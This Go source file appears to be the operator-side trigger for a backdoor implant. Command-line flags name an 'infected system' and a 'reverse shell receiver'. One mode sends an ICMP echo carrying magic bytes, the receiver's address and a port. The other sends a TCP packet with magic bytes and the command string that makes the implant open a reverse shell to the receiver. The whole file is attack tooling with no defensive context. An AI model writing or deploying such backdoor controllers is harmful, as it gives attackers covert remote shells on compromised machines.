package main

import (
	"encoding/binary"
	"flag"
	"log"
	"net"
	"os"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func main() {
	port := flag.Int("port", 1337, "")
	addr := flag.String("addr", "10.10.10.10", "Address of infected system")
	targAddr := flag.String("targaddr", "10.20.20.20", "Address of reverse shell receiver")

	addrIP := net.ParseIP(*addr)
	targAddrIP := net.ParseIP(*targAddr)

	flag.Parse()

	if os.Args[1] == "ping" {
		ping(*port, addrIP, targAddrIP)
	} else if os.Args[1] == "shell" {
		shell(*port, addrIP, targAddrIP)
	}
}

func shell(portNr int, addr, targAddr net.IP) {
	conn, err := net.Dial("tcp", addr.String())
	if err != nil {
		log.Fatal(err.Error())
	}

	ip := []byte{127, 0, 0, 1}
	port := make([]byte, 2)
	binary.BigEndian.PutUint16(port, uint16(portNr))

	payload := []byte{0x52, 0x93, 1, 1} // magic bytes + padding
	payload = append(payload, ip...)
	payload = append(payload, port...)
	payload = append(payload, []byte("justforfun")...) // command for reverse shell
	payload = append(payload, targAddr...)

	_, err = conn.Write(payload)
	if err != nil {
		log.Fatal(err.Error())
	}
}

func ping(portNr int, addr, targAddr net.IP) {
	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}
	defer c.Close()

	port := make([]byte, 2)
	binary.BigEndian.PutUint16(port, uint16(portNr))

	payload := []byte("rU__")
	payload = append(payload, targAddr...)
	payload = append(payload, port...)

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: 1,
			Data: payload,
		},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := c.WriteTo(wb, &net.IPAddr{IP: addr}); err != nil {
		log.Fatal(err.Error())
	}

	rb := make([]byte, 1500)
	n, peer, err := c.ReadFrom(rb)
	if err != nil {
		log.Fatal(err)
	}
	rm, err := icmp.ParseMessage(1, rb[:n])
	if err != nil {
		log.Fatal(err)
	}
	switch rm.Type {
	case ipv4.ICMPTypeEchoReply:
		log.Printf("got reflection from %v", peer)
		log.Printf("%+v", rm)
	default:
		log.Printf("got %+v; want echo reply", rm)
	}
}
